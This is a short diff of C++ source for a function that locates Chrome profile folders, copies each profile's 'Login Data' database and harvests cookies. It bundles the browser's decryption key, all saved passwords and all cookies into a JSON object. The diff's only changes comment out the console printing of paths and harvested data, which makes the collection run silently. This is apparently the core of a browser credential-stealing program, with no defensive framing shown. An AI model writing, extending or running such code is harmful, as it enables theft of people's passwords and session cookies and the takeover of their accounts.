@@ -178,7 +178,7 @@ json driver(){
         //std::cout << "ENTRY ----->    " << entry.path().string() << '\n';
         //std::cout << prefix << "     " << entry.path().string().substr(s.size() + 1, prefix.size() ) << '\n';
         if (!prefix.compare(entry.path().string().substr(s.size() + 1, prefix.size()))) {
-            std::cout << entry.path().string() << '\n';
+            //std::cout << entry.path().string() << '\n';
             prof_path =  entry.path().string() + std::string("\\Login Data");
             const char * db_path = prof_path.c_str();
             const char * temp = "ChromeData.db";
@@ -197,9 +197,9 @@ json driver(){
                 printf("Error: %d\n", GetLastError());
                 return -1;
             }
-            printf("\n\n\n-----RES beg------\n\n\n");
-            std::cout << getAllCookies(temp);
-            printf("\n\n\n-----RE end------\n\n\n");
+            //printf("\n\n\n-----RES beg------\n\n\n");
+            //std::cout << getAllCookies(temp);
+            //printf("\n\n\n-----RE end------\n\n\n");
 
             
             allCookies[prof_path] = json(getAllCookies(temp));
@@ -222,7 +222,7 @@ json driver(){
    test["KEY"] = hexStr(key->pbData, key->cbData);
    test["PASSWORDS"] = allPWs;
    test["COOKIES"] = allCookies;
-   std::cout << "\n\n\n---------------------------\n\n\n" << test.dump() << "\n\n\n--------------------------\n\n\n";
+   //std::cout << "\n\n\n---------------------------\n\n\n" << test.dump() << "\n\n\n--------------------------\n\n\n";
    //[path: results]
    //sqlite3_close(db);
    return test;
